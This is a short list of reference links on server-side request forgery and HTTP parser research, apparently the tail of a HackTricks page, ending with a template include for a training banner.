- [https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/](https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/)
- [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)
- [Tenable – SSRF Vulnerability in Java TLS Handshakes That Creates DoS Risk](https://www.tenable.com/blog/tenable-discovers-ssrf-vulnerability-in-java-tls-handshakes-that-creates-dos-risk)
- [RFC 5280 §4.2.2.1 Authority Information Access](https://datatracker.ietf.org/doc/html/rfc5280#section-4.2.2.1)

{{#include ../../banners/hacktricks-training.md}}
